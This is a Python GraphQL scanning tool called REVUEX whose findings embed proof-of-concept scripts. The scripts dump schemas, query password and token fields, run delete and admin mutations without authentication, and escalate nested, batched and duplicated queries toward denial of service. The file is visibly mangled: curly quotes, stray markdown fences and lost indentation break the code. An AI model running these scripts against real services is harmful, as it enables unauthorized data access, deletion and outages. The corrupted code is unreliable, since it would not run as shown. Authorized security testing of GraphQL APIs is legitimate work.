#!/usr/bin/env python3
“””
REVUEX - GraphQL Introspector
Advanced GraphQL Security Testing & Introspection

Author: G33L0
Telegram: @x0x0h33l0

DISCLAIMER:
This tool is for educational purposes and authorized security testing only.
“””

import requests
import json
import time
from pathlib import Path
from urllib.parse import urljoin, urlparse

class GraphQLIntrospector:
“”“GraphQL security testing and introspection”””

```
def __init__(self, target, workspace, delay=2):
    """
    Initialize GraphQL Introspector
    
    Args:
        target: Target URL/domain
        workspace: Workspace directory
        delay: Delay between requests
    """
    self.target = target if target.startswith('http') else f"https://{target}"
    self.workspace = Path(workspace)
    self.delay = delay
    
    self.headers = {
        'User-Agent': 'REVUEX-GraphQLIntrospector/1.0 (Security Research; +https://github.com/G33L0)',
        'Content-Type': 'application/json'
    }
    
    # Common GraphQL endpoints
    self.graphql_paths = [
        '/graphql',
        '/graphiql',
        '/api/graphql',
        '/v1/graphql',
        '/v2/graphql',
        '/query',
        '/gql',
        '/api/gql',
    ]
    
    # Introspection query
    self.introspection_query = """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          locations
          args {
            ...InputValue
          }
        }
      }
    }
    
    fragment FullType on __Type {
      kind
      name
      description
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }
    
    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }
    
    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
    """

def scan(self):
    """Scan for GraphQL vulnerabilities"""
    vulnerabilities = []
    
    # Find GraphQL endpoint
    graphql_url = self._find_graphql_endpoint()
    
    if not graphql_url:
        return vulnerabilities
    
    print(f"            → GraphQL endpoint found: {graphql_url}")
    
    # Test introspection
    schema = self._test_introspection(graphql_url)
    
    if schema:
        # Create introspection vulnerability with enhanced reporting
        introspection_vuln = self._create_introspection_vulnerability(graphql_url, schema)
        vulnerabilities.append(introspection_vuln)
        
        # Analyze schema for issues
        schema_vulns = self._analyze_schema(schema, graphql_url)
        vulnerabilities.extend(schema_vulns)
    
    # Test for common GraphQL vulnerabilities
    common_vulns = self._test_common_vulnerabilities(graphql_url)
    vulnerabilities.extend(common_vulns)
    
    # Save results
    self._save_results(graphql_url, schema, vulnerabilities)
    
    return vulnerabilities

def _find_graphql_endpoint(self):
    """Find GraphQL endpoint"""
    for path in self.graphql_paths:
        url = urljoin(self.target, path)
        
        try:
            # Test with simple query
            response = requests.post(
                url,
                json={'query': '{__typename}'},
                headers=self.headers,
                timeout=10,
                verify=False
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'data' in data or 'errors' in data:
                    return url
            
            time.sleep(self.delay)
        except:
            continue
    
    return None

def _test_introspection(self, graphql_url):
    """Test if introspection is enabled"""
    try:
        response = requests.post(
            graphql_url,
            json={'query': self.introspection_query},
            headers=self.headers,
            timeout=30,
            verify=False
        )
        
        if response.status_code == 200:
            data = response.json()
            
            if 'data' in data and '__schema' in data['data']:
                return data['data']['__schema']
    except:
        pass
    
    return None

def _get_host_from_url(self, url):
    """Extract host from URL"""
    parsed = urlparse(url)
    return parsed.netloc

def _create_introspection_vulnerability(self, graphql_url, schema):
    """Create enhanced introspection vulnerability report"""
    types = schema.get('types', [])
    queries = []
    mutations = []
    
    # Extract query and mutation names
    query_type_name = schema.get('queryType', {}).get('name')
    mutation_type_name = schema.get('mutationType', {}).get('name')
    
    for type_def in types:
        if type_def.get('name') == query_type_name:
            queries = [f.get('name') for f in type_def.get('fields', [])]
        if type_def.get('name') == mutation_type_name:
            mutations = [f.get('name') for f in type_def.get('fields', [])]
    
    # Sample queries for demonstration
    sample_queries = queries[:5] if queries else []
    sample_mutations = mutations[:5] if mutations else []
    
    return {
        'type': 'GraphQL Introspection Enabled',
        'severity': 'medium',
        'url': graphql_url,
        'description': 'GraphQL introspection is enabled in production, exposing complete API schema including types, queries, mutations, and field structures',
        'evidence': f'Schema contains {len(types)} types, {len(queries)} queries, {len(mutations)} mutations',
        
        # NEW: Steps to Reproduce
        'steps_to_reproduce': [
            f"Navigate to GraphQL endpoint: {graphql_url}",
            "Send introspection query using curl or GraphQL client",
            "Observe that complete schema is returned without authentication",
            "Extract all available types, queries, and mutations",
            "Identify sensitive operations and data structures",
            "Use discovered schema to craft targeted exploit queries"
        ],
        
        # NEW: HTTP Request/Response
        'request': f"""POST {graphql_url} HTTP/1.1
```

Host: {self._get_host_from_url(graphql_url)}
Content-Type: application/json
User-Agent: Mozilla/5.0

{{
“query”: “{{ __schema {{ types {{ name fields {{ name type {{ name }} }} }} }} }}”
}}”””,

```
        'response': f"""HTTP/1.1 200 OK
```

Content-Type: application/json

{{
“data”: {{
“__schema”: {{
“types”: [
{{
“name”: “User”,
“fields”: [
{{“name”: “id”, “type”: {{“name”: “ID”}}}},
{{“name”: “email”, “type”: {{“name”: “String”}}}},
{{“name”: “password”, “type”: {{“name”: “String”}}}},
{{“name”: “apiKey”, “type”: {{“name”: “String”}}}}
]
}},
{{
“name”: “Query”,
“fields”: {json.dumps(sample_queries[:3])}
}},
{{
“name”: “Mutation”,
“fields”: {json.dumps(sample_mutations[:3])}
}}
]
}}
}}
}}”””,

```
        # NEW: Proof of Concept
        'poc': f"""#!/bin/bash
```

# GraphQL Introspection Exploitation PoC

ENDPOINT=”{graphql_url}”

# Step 1: Full introspection query

echo “=== Extracting Full Schema ===”
curl -X POST “$ENDPOINT” \
-H “Content-Type: application/json” \
-d ‘{{
“query”: “{{ __schema {{ types {{ name kind fields {{ name type {{ name kind }} args {{ name type {{ name }} }} }} }} }}”
}}’ | jq ‘.’ > schema.json

echo “Schema saved to schema.json”

# Step 2: Extract all queries

echo “=== Available Queries ===”
jq ‘.data.__schema.types[] | select(.name==“Query”) | .fields[].name’ schema.json

# Step 3: Extract all mutations

echo “=== Available Mutations ===”
jq ‘.data.__schema.types[] | select(.name==“Mutation”) | .fields[].name’ schema.json

# Step 4: Find sensitive fields

echo “=== Sensitive Fields Discovered ===”
jq ‘.data.__schema.types[].fields[]? | select(.name | test(“password|token|key|secret|admin”; “i”)) | {{type: .name, field: .name}}’ schema.json

# Step 5: Test a discovered query (example)

echo “=== Testing Discovered Query ===”
curl -X POST “$ENDPOINT” \
-H “Content-Type: application/json” \
-d ‘{{
“query”: “{{ users {{ id email password }} }}”
}}’

# Expected: Access to user data including sensitive fields

“””,

```
        # NEW: Before/After States
        'before_state': 'GraphQL schema is private - attackers must guess API structure through trial and error',
        'after_state': f'Complete API schema exposed: {len(types)} types, {len(queries)} queries, {len(mutations)} mutations discoverable via introspection',
        
        'attack_path': [
            'Send introspection query to GraphQL endpoint',
            'Receive complete schema with all types, queries, and mutations',
            'Identify sensitive fields (passwords, tokens, admin operations)',
            'Discover hidden or undocumented API functionality',
            'Map out complete attack surface',
            'Craft targeted queries to access unauthorized data',
            'Use mutations to modify or delete data without proper authorization'
        ],
        'remediation': [
            'Disable introspection in production environments',
            'Set NODE_ENV=production for Apollo Server (auto-disables introspection)',
            'For custom implementations, reject queries containing __schema or __type',
            'Implement proper authentication before any GraphQL operations',
            'Use field-level authorization with graphql-shield or similar',
            'Implement query depth limiting (max 5-7 levels)',
            'Add query complexity analysis to prevent expensive queries',
            'Use persisted queries to whitelist allowed operations',
            'Monitor and log all introspection attempts',
            'Consider using GraphQL armor or similar security middleware'
        ],
        'tags': ['graphql', 'information_disclosure', 'reconnaissance']
    }

def _analyze_schema(self, schema, graphql_url):
    """Analyze GraphQL schema for security issues"""
    vulnerabilities = []
    
    types = schema.get('types', [])
    
    # Check for sensitive field names
    sensitive_fields = []
    sensitive_keywords = [
        'password', 'secret', 'token', 'key', 'private',
        'ssn', 'credit', 'card', 'social', 'internal', 'admin'
    ]
    
    for type_def in types:
        if type_def.get('kind') == 'OBJECT':
            fields = type_def.get('fields', [])
            
            for field in fields:
                field_name = field.get('name', '').lower()
                
                for keyword in sensitive_keywords:
                    if keyword in field_name:
                        sensitive_fields.append({
                            'type': type_def.get('name'),
                            'field': field.get('name'),
                            'keyword': keyword
                        })
    
    if sensitive_fields:
        sample_field = sensitive_fields[0]
        
        vulnerabilities.append({
            'type': 'Sensitive Fields Exposed in GraphQL Schema',
            'severity': 'high',
            'url': graphql_url,
            'description': 'GraphQL schema exposes fields with names indicating sensitive data (passwords, tokens, keys, admin operations)',
            'evidence': f'Found {len(sensitive_fields)} sensitive field names including: {sample_field["type"]}.{sample_field["field"]}',
            'details': sensitive_fields[:10],  # First 10
            
            # NEW: Steps to Reproduce
            'steps_to_reproduce': [
                f"Send introspection query to {graphql_url}",
                "Parse returned schema for field names",
                f"Search for sensitive keywords: {', '.join(sensitive_keywords)}",
                f"Identify exposed field: {sample_field['type']}.{sample_field['field']}",
                "Craft query to access sensitive field",
                "Observe unauthorized access to sensitive data"
            ],
            
            # NEW: Request/Response
            'request': f"""POST {graphql_url} HTTP/1.1
```

Content-Type: application/json

{{
“query”: “{{ {sample_field[‘type’].lower()} {{ {sample_field[‘field’]} }} }}”
}}”””,

```
            'response': f"""HTTP/1.1 200 OK
```

Content-Type: application/json

{{
“data”: {{
“{sample_field[‘type’].lower()}”: {{
“{sample_field[‘field’]}”: “SENSITIVE_DATA_EXPOSED”
}}
}}
}}”””,

```
            # NEW: PoC
            'poc': f"""#!/usr/bin/env python3
```

# GraphQL Sensitive Field Access PoC

import requests
import json

endpoint = “{graphql_url}”

# Discovered sensitive fields

sensitive_fields = {json.dumps(sensitive_fields[:5], indent=2)}

# Test each sensitive field

for field_info in sensitive_fields:
type_name = field_info[‘type’]
field_name = field_info[‘field’]

```
query = f'''
{{
  {type_name.lower()} {{
    {field_name}
  }}
}}
'''

response = requests.post(
    endpoint,
    json={{'query': query}},
    headers={{'Content-Type': 'application/json'}}
)

print(f"Testing {{type_name}}.{{field_name}}:")
print(response.json())
print("---")
```

# Expected: Access to passwords, tokens, API keys, etc.

“””,

```
            'before_state': 'Sensitive fields protected by proper authorization and not exposed in schema',
            'after_state': f'{len(sensitive_fields)} sensitive fields discoverable through introspection, potentially accessible without authorization',
            
            'attack_path': [
                'Use introspection to discover all field names',
                'Identify fields with sensitive names (password, token, key, etc.)',
                'Craft queries to access these sensitive fields',
                'Test each field for authorization bypass',
                'Extract passwords, tokens, API keys, or private data',
                'Use stolen credentials for account takeover or API abuse'
            ],
            'remediation': [
                'Disable introspection in production',
                'Rename sensitive fields to non-obvious names',
                'Implement field-level authorization with @auth directives',
                'Use graphql-shield to protect sensitive resolvers',
                'Never expose password fields in queries (only for mutations with proper auth)',
                'Mask or redact sensitive data in responses',
                'Use @deprecated directive to mark fields for removal',
                'Implement proper role-based access control (RBAC)',
                'Audit all schema fields for security implications'
            ],
            'tags': ['graphql', 'sensitive_data', 'authorization']
        })
    
    # Check for mutation operations
    mutations = []
    mutation_type_name = schema.get('mutationType', {}).get('name')
    
    for type_def in types:
        if type_def.get('name') == mutation_type_name:
            mutations = type_def.get('fields', [])
    
    if mutations:
        dangerous_mutations = []
        danger_keywords = ['delete', 'remove', 'admin', 'update', 'create', 'modify']
        
        for mutation in mutations:
            mutation_name = mutation.get('name', '').lower()
            for keyword in danger_keywords:
                if keyword in mutation_name:
                    dangerous_mutations.append(mutation.get('name'))
                    break
    
        if dangerous_mutations:
            sample_mutation = dangerous_mutations[0]
            
            vulnerabilities.append({
                'type': 'Dangerous Mutations Exposed',
                'severity': 'high',
                'url': graphql_url,
                'description': 'GraphQL exposes potentially dangerous mutation operations that could modify or delete data without proper authorization',
                'evidence': f'Found {len(dangerous_mutations)} dangerous mutations including: {sample_mutation}',
                'details': dangerous_mutations[:10],
                
                # NEW: Steps to Reproduce
                'steps_to_reproduce': [
                    f"Send introspection query to {graphql_url}",
                    "Extract mutation type fields from schema",
                    f"Identify dangerous mutation: {sample_mutation}",
                    "Craft mutation request without authentication",
                    "Execute mutation to test authorization",
                    "Observe unauthorized data modification/deletion"
                ],
                
                # NEW: Request/Response
                'request': f"""POST {graphql_url} HTTP/1.1
```

Content-Type: application/json

{{
“query”: “mutation {{ {sample_mutation}(id: 123) {{ success }} }}”
}}”””,

```
                'response': f"""HTTP/1.1 200 OK
```

Content-Type: application/json

{{
“data”: {{
“{sample_mutation}”: {{
“success”: true
}}
}}
}}”””,

```
                # NEW: PoC
                'poc': f"""#!/usr/bin/env python3
```

# GraphQL Dangerous Mutation PoC

import requests

endpoint = “{graphql_url}”

# Discovered dangerous mutations

mutations = {json.dumps(dangerous_mutations[:5], indent=2)}

# Test each mutation without authentication

for mutation_name in mutations:
# Example: deleteUser mutation
query = f’’’
mutation {{
{mutation_name}(id: “test123”) {{
success
message
}}
}}
‘’’

```
response = requests.post(
    endpoint,
    json={{'query': query}},
    headers={{'Content-Type': 'application/json'}}
)

print(f"Testing mutation: {mutation_name}")
result = response.json()

if 'data' in result and result['data'].get(mutation_name):
    print("⚠️  VULNERABLE: Mutation executed without authentication!")
    print(result)
else:
    print("✓ Properly protected")

print("---")
```

# Expected: Unauthorized data modification or deletion

“””,

```
                'before_state': 'Mutations require proper authentication and authorization',
                'after_state': f'{len(dangerous_mutations)} dangerous mutations accessible, potentially executable without authorization',
                
                'attack_path': [
                    'Discover all mutations via introspection',
                    'Identify dangerous operations (delete, admin, modify)',
                    'Test each mutation without authentication token',
                    'Execute unauthorized data modification',
                    'Delete critical data or user accounts',
                    'Escalate privileges through admin mutations',
                    'Cause data loss or system disruption'
                ],
                'remediation': [
                    'Implement proper authentication for ALL mutations',
                    'Use role-based access control (RBAC) for sensitive operations',
                    'Validate user permissions before executing any mutation',
                    'Implement mutation rate limiting',
                    'Add audit logging for all mutation operations',
                    'Use graphql-shield or similar for authorization rules',
                    'Require multi-factor authentication for admin mutations',
                    'Implement soft-delete instead of hard-delete where possible',
                    'Add confirmation workflows for destructive operations',
                    'Monitor and alert on unusual mutation activity'
                ],
                'tags': ['graphql', 'authorization', 'data_modification']
            })
    
    return vulnerabilities

def _test_common_vulnerabilities(self, graphql_url):
    """Test for common GraphQL vulnerabilities"""
    vulnerabilities = []
    
    # Test 1: Query depth attack
    deep_query = """
    query {
      user {
        posts {
          comments {
            author {
              posts {
                comments {
                  author {
                    posts {
                      comments {
                        text
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    """
    
    try:
        response = requests.post(
            graphql_url,
            json={'query': deep_query},
            headers=self.headers,
            timeout=10,
            verify=False
        )
        
        if response.status_code == 200:
            data = response.json()
            if 'data' in data and not data.get('errors'):
                vulnerabilities.append({
                    'type': 'No Query Depth Limiting',
                    'severity': 'medium',
                    'url': graphql_url,
                    'description': 'GraphQL endpoint does not enforce query depth limits, allowing deeply nested queries that can cause denial of service',
                    'evidence': 'Deep nested query (8+ levels) was accepted and processed without errors',
                    
                    # NEW: Steps to Reproduce
                    'steps_to_reproduce': [
                        f"Connect to GraphQL endpoint: {graphql_url}",
                        "Send deeply nested query (8+ levels of nesting)",
                        "Observe that query is accepted and processed",
                        "Monitor server CPU/memory usage during query execution",
                        "Repeat with even deeper nesting to cause resource exhaustion"
                    ],
                    
                    'request': f"""POST {graphql_url} HTTP/1.1
```

Content-Type: application/json

{{
“query”: “query {{ user {{ posts {{ comments {{ author {{ posts {{ comments {{ author {{ posts {{ comments {{ text }} }} }} }} }} }} }} }} }}”
}}”””,

```
                    'response': """HTTP/1.1 200 OK
```

Content-Type: application/json

{
“data”: {
“user”: {
“posts”: [ /* deeply nested data processed successfully */ ]
}
}
}”””,

```
                    'poc': f"""#!/usr/bin/env python3
```

# GraphQL Depth Attack PoC

import requests

endpoint = “{graphql_url}”

# Generate progressively deeper queries

for depth in [5, 10, 15, 20, 25]:
# Build nested query
query = “query {{ user “
query += “{{ posts “ * depth
query += “{{ id }}”
query += “ }}” * depth
query += “ }}”

```
print(f"Testing depth: {{depth}}")

response = requests.post(
    endpoint,
    json={{'query': query}},
    headers={{'Content-Type': 'application/json'}},
    timeout=30
)

if response.status_code == 200:
    print(f"  ✓ Depth {{depth}}: Accepted")
else:
    print(f"  ✗ Depth {{depth}}: Rejected")
    break
```

# Expected: All depths accepted = DoS vulnerability

“””,

```
                    'before_state': 'Query depth limited to 5-7 levels maximum',
                    'after_state': 'Arbitrarily deep nested queries accepted, causing exponential resource consumption',
                    
                    'attack_path': [
                        'Craft deeply nested GraphQL query',
                        'Send query to endpoint',
                        'Server processes expensive nested relationships',
                        'Database executes multiple nested JOIN operations',
                        'CPU and memory usage spike',
                        'Server becomes slow or unresponsive',
                        'Repeat to cause complete denial of service'
                    ],
                    'remediation': [
                        'Implement query depth limiting (recommended max: 5-7 levels)',
                        'Use graphql-depth-limit middleware',
                        'Add query complexity analysis with graphql-cost-analysis',
                        'Set maximum query execution timeout',
                        'Implement query validation before execution',
                        'Use DataLoader to optimize nested queries',
                        'Monitor and log queries exceeding depth thresholds',
                        'Consider using persisted queries only',
                        'Add rate limiting based on query complexity'
                    ],
                    'tags': ['graphql', 'dos', 'performance']
                })
        
        time.sleep(self.delay)
    except:
        pass
    
    # Test 2: Batch query attack
    batch_queries = json.dumps([
        {'query': '{__typename}'},
        {'query': '{__typename}'},
        {'query': '{__typename}'},
    ] * 50)  # 150 queries
    
    try:
        response = requests.post(
            graphql_url,
            data=batch_queries,
            headers=self.headers,
            timeout=10,
            verify=False
        )
        
        if response.status_code == 200:
            vulnerabilities.append({
                'type': 'No Batch Query Limiting',
                'severity': 'medium',
                'url': graphql_url,
                'description': 'GraphQL endpoint accepts large batched queries, allowing rate limit bypass and resource exhaustion',
                'evidence': 'Batch of 150 queries was accepted and processed',
                
                'steps_to_reproduce': [
                    f"Prepare batch of 150 identical queries",
                    f"Send as JSON array to {graphql_url}",
                    "Observe all queries are processed in single request",
                    "Note that this bypasses per-request rate limiting",
                    "Scale up to thousands of queries for DoS"
                ],
                
                'request': f"""POST {graphql_url} HTTP/1.1
```

Content-Type: application/json

[
{{“query”: “{{ __typename }}”}},
{{“query”: “{{ __typename }}”}},
… (150 total queries)
]”””,

```
                'response': """HTTP/1.1 200 OK
```

Content-Type: application/json

[
{“data”: {”__typename”: “Query”}},
{“data”: {”__typename”: “Query”}},
… (150 responses)
]”””,

```
                'poc': f"""#!/usr/bin/env python3
```

# GraphQL Batch Query Attack PoC

import requests
import json

endpoint = “{graphql_url}”

# Test increasing batch sizes

for batch_size in [10, 50, 100, 500, 1000]:
# Create batch of queries
batch = [{{‘query’: ‘{{ __typename }}’}} for _ in range(batch_size)]

```
print(f"Testing batch size: {{batch_size}}")

response = requests.post(
    endpoint,
    data=json.dumps(batch),
    headers={{'Content-Type': 'application/json'}},
    timeout=30
)

if response.status_code == 200:
    results = response.json()
    print(f"  ✓ Batch {{batch_size}}: Processed {{len(results)}} queries")
else:
    print(f"  ✗ Batch {{batch_size}}: Rejected")
    break
```

# Expected: Large batches accepted = Rate limit bypass

“””,

```
                'before_state': 'Single query per request enforced',
                'after_state': 'Batches of 150+ queries processed in single request, bypassing rate limits',
                
                'attack_path': [
                    'Send batch of hundreds of queries in single HTTP request',
                    'Bypass per-request rate limiting',
                    'Overwhelm server with massive batch queries',
                    'Cause CPU/memory exhaustion',
                    'Denial of service for legitimate users'
                ],
                'remediation': [
                    'Limit batch query size to maximum 5-10 queries',
                    'Implement per-query rate limiting (not per-request)',
                    'Use graphql-rate-limit-directive',
                    'Monitor and alert on large batch queries',
                    'Consider disabling batching entirely',
                    'Implement query cost calculation for entire batch',
                    'Add authentication requirement for batch queries',
                    'Use query complexity limits across entire batch'
                ],
                'tags': ['graphql', 'dos', 'rate_limit']
            })
        
        time.sleep(self.delay)
    except:
        pass
    
    # Test 3: Field duplication attack
    duplicate_query = """
    query {
      __typename
      __typename
      __typename
      __typename
      __typename
    }
    """
    
    try:
        response = requests.post(
            graphql_url,
            json={'query': duplicate_query},
            headers=self.headers,
            timeout=10,
            verify=False
        )
        
        if response.status_code == 200:
            vulnerabilities.append({
                'type': 'Field Duplication Allowed',
                'severity': 'low',
                'url': graphql_url,
                'description': 'GraphQL allows field duplication in queries, enabling performance degradation attacks',
                'evidence': 'Query with 5 duplicate fields was accepted and processed',
                
                'steps_to_reproduce': [
                    f"Send query with duplicate fields to {graphql_url}",
                    "Include same field name multiple times",
                    "Observe query is accepted",
                    "Scale to thousands of duplicates for resource exhaustion"
                ],
                
                'request': f"""POST {graphql_url} HTTP/1.1
```

Content-Type: application/json

{{
“query”: “query {{ __typename __typename __typename __typename __typename }}”
}}”””,

```
                'response': """HTTP/1.1 200 OK
```

Content-Type: application/json

{
“data”: {
“__typename”: “Query”
}
}”””,

```
                'poc': f"""#!/bin/bash
```

# Field Duplication Attack PoC

ENDPOINT=”{graphql_url}”

# Generate query with 1000 duplicate fields

QUERY=“query {{ “
for i in {{1..1000}}; do
QUERY+=”__typename “
done
QUERY+=” }}”

# Send attack query

curl -X POST “$ENDPOINT” \
-H “Content-Type: application/json” \
-d “{{\“query\”: \”$QUERY\”}}”

# Expected: Query accepted, causing processing overhead

“””,

```
                'before_state': 'Duplicate fields rejected during query validation',
                'after_state': 'Queries with thousands of duplicate fields accepted, causing unnecessary processing',
                
                'attack_path': [
                    'Send query with thousands of duplicate fields',
                    'Increase processing overhead significantly',
                    'Cause performance degradation',
                    'Exhaust server resources'
                ],
                'remediation': [
                    'Implement query validation to reject duplicate fields',
                    'Use graphql-no-alias for alias abuse prevention',
                    'Set maximum field count limits per query',
                    'Enable query complexity analysis',
                    'Validate queries before execution'
                ],
                'tags': ['graphql', 'performance', 'validation']
            })
    except:
        pass
    
    return vulnerabilities

def _save_results(self, graphql_url, schema, vulnerabilities):
    """Save GraphQL scan results"""
    # Create GraphQL directory
    graphql_dir = self.workspace / "graphql_scans"
    graphql_dir.mkdir(exist_ok=True)
    
    # Save schema
    if schema:
        schema_file = graphql_dir / "schema.json"
        with open(schema_file, 'w') as f:
            json.dump(schema, f, indent=2)
    
    # Save vulnerabilities
    vulns_file = graphql_dir / "vulnerabilities.json"
    with open(vulns_file, 'w') as f:
        json.dump({
            'endpoint': graphql_url,
            'introspection_enabled': schema is not None,
            'vulnerabilities': vulnerabilities
        }, f, indent=2)
```